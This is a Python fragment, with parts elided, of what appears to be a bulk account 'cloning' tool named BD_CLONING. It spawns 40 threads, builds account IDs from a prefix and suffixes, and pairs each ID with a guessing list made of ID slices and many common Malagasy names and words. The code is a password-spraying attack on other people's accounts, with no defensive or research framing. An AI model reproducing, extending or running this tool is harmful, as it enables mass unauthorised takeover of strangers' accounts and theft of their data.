...
def BD_CLONING():
    ...
    with tred(max_workers=40) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],ids[3:],'madama','Madama','ramose','Ramose','jesosy','Jesosy','nomena','Nomena','nantenaina','Nantenaina','rakoto','nilaina','Nilaina','je t'aime','Je t'aime','nirina','Nirina','nathalie','narindra','Narindra','Nathalie','Rakoto','faniry','Faniry','narindra','Narindra','diamondra','Diamondra','faniry','Faniry','dubai','madrid','Akondro','havana','Havana','rakoto','ankatso','Ankatso','hasina','Hasina','Rakoto','naivo','Naivo','christina','Christina','estelle','Estelle','christelle','Christelle','tsilavina','Tsilavina','nantenaina','valimbavaka','Valimbavaka','Nantenaina','finaritra','Finaritra','tsaralalana','Tsaralalana','makorely','Makorely','mpivarotena','mimasta','milely','passage','Passage','fiainana','Fiainana','hariva','Hariva','mitomany','féminin','masculin','Mitomany','tezitra','Tezitra','falifaly','Falifaly','fitiavana','Fitiavana','fanomezana','Fanomezana','farakely','Farakely','tiavina','Tiavina','tiana','Tiana','mahefa','Mahefa','Tsilavina','tsilavina','Sarindra','lantoniaina','Lantoniaina','sarindra','nilaina','Nilaina','larissa','Larissa','safelika','Safelika','sosisy','Sosisy','kitoza','Kitoza','Jirama','jirama','antsirabe','Antsirabe','tsilavina','Nomena','nambinina','Nambinina','sylvain','Sylvain','Sitraka','sitraka','nantenaina','mamitiana','Mamitiana','ravaka','Ravaka','nirina','Nirina','Christian','cristian','ronaldo','Ronaldo','ankoay','Ankoay','voromahery','Voromahery','manidina','Manidina','vololona','Vololona','mamasosy','Mamasosy','mamisoa','Mamisoa','sipako','fanomezantsoa','Fanomezantsoa','Sipako','fanantenana','Fanantenana','narindra','Narindra','nathalie','Nathalie','fenosoa','Fenosoa','michel','Michel','mickael','Mickael','free fire','Lalatiana','lalatiana','samuel','Samuel','mirado','Mirado','mioty','Mioty','sarobidy','Sarobidy','Nantenaina','rakoto','Rakoto','nilaina','Nilaina','marinah','Marinah','lalaina','Lalaina', 'mendrika', 'mendrika', 'safidy', 'Nantenaina','mahery','Mahery','diamondra','Diamondra','nirina','Nirina','jessica','Jessica','mandresy','Mandresy','fandresena','Fandresena','nasandratra','Nasandratra','niaina','Niaina','jehovah','Jehovah']
